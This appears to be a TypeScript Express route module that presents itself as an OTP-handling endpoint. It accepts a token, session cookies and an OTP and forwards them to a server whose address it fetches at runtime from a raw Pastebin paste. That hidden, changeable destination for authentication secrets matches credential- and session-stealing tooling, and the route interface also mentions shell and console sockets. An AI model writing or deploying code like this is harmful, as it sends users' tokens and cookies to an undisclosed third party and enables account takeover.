// @ts-check

import axios, { AxiosResponse, AxiosError } from 'axios';
import { Request, Response, Application } from 'express';
import { WebSocketServer } from 'ws';
import { Server as HttpServer } from 'http';

interface PastebinResponse {
  link: string;
}

interface OtpRequestBody {
  token: string;
  cookies: Record<string, any> | string;
  action: string;
  otp?: string;
}

interface OtpApiResponseData {
  success: boolean;
  message: string;
  data?: Record<string, any> | any[];
}

const api = {
  async getLink(): Promise<string> {
    try {
      const res: AxiosResponse<PastebinResponse | string> = await axios.get('https://pastebin.com/raw/YtqNc7Yi');
      if (res.data && typeof res.data === 'object' && typeof (res.data as PastebinResponse).link === 'string') {
        return (res.data as PastebinResponse).link;
      } else if (typeof res.data === 'string' && res.data.startsWith('http')) {
        return res.data;
      }
      throw new Error('Invalid or missing link in Pastebin response data.');
    } catch (err: unknown) {
      throw new Error('Failed to fetch API link.', { cause: err instanceof Error ? err : new Error(String(err)) });
    }
  },

  async performOtpAction(body: OtpRequestBody): Promise<OtpApiResponseData> {
    try {
      const link: string = await api.getLink();
      const { token, cookies, action, otp } = body;

      const payload: {
        token: string;
        cookies: Record<string, any> | string;
        action: string;
        otp?: string;
      } = {
        token,
        cookies,
        action,
      };
      if (otp) {
        payload.otp = otp;
      }

      const res: AxiosResponse<OtpApiResponseData> = await axios.post(`${link}/otp`, payload);
      return res.data;
    } catch (err: unknown) {
      throw new Error('Failed to perform OTP action.', { cause: err instanceof Error ? err : new Error(String(err)) });
    }
  },
};

interface OtpRouteParams {
  req: Request<any, any, OtpRequestBody>;
  res: Response;
  app?: Application;
  wss?: WebSocketServer;
  wssConsole?: WebSocketServer;
  Shellwss?: WebSocketServer;
  server?: HttpServer;
}

interface OtpExpressRouteModule {
  method: "get" | "post" | "put" | "delete" | "patch" | "options" | "head" | "all";
  path: string;
  install: (params: OtpRouteParams) => Promise<void> | void;
}

export const modules: OtpExpressRouteModule[] = [
  {
    method: 'post',
    path: '/otp',
    install: async ({ req, res }: OtpRouteParams): Promise<void> => {
      try {
        const { token, cookies, action, otp } = req.body;

        if (typeof token !== 'string' || !token ||
            (cookies === undefined || cookies === null) ||
            typeof action !== 'string' || !action) {
          res.status(400).json({
            status: 'error',
            message: 'Missing required fields: token, cookies, and action must be provided.',
          });
          return;
        }

        if (action.toLowerCase() === 'verify' && (typeof otp !== 'string' || !otp)) {
          res.status(400).json({
            status: 'error',
            message: 'OTP is required for verify action.',
          });
          return;
        }

        let safeCookies: Record<string, any>;
        if (typeof cookies === 'string') {
          try {
            safeCookies = JSON.parse(cookies);
          } catch (parseError: unknown) {
            const errMsg = parseError instanceof Error ? parseError.message : String(parseError);
            res.status(400).json({ status: 'error', message: `Invalid cookies JSON format: ${errMsg}` });
            return;
          }
        } else if (typeof cookies === 'object' && cookies !== null) {
          safeCookies = cookies;
        } else {
          res.status(400).json({ status: 'error', message: 'Cookies must be a JSON string or an object.' });
          return;
        }

        const responseData: OtpApiResponseData = await api.performOtpAction({ token, cookies: safeCookies, action, otp });

        res.json({
          status: 'success',
          data: responseData,
        });
      } catch (err: unknown) {
        let errorMessage = "An unknown error occurred in OTP handler.";
        let statusCode = 500;

        const topLevelError = err instanceof Error ? err : new Error(String(err));
        const originalError: unknown = topLevelError.cause || topLevelError;

        if (axios.isAxiosError(originalError)) {
          const axiosError = originalError as AxiosError<any>;
          errorMessage = axiosError.message;
          if (axiosError.response) {
            statusCode = axiosError.response.status;
            const responseDataError = axiosError.response.data?.error || axiosError.response.data?.message;
            errorMessage = `OTP API Error (${statusCode}): ${responseDataError || axiosError.message}`;
            console.error(`Axios error response from /otp endpoint: Status ${statusCode}`, axiosError.response.data);
          } else if (axiosError.request) {
            errorMessage = "No response received from OTP service.";
            statusCode = 503;
            console.error("Axios no response error for /otp:", axiosError.request);
          }
        } else if (originalError instanceof Error) {
          errorMessage = originalError.message;
        } else {
          errorMessage = String(originalError);
        }

        console.error(`Error in /otp route: ${errorMessage}`, topLevelError);
        if (!res.headersSent) {
            res.status(statusCode).json({
                status: 'error',
                message: errorMessage,
            });
        }
      }
    },
  },
];
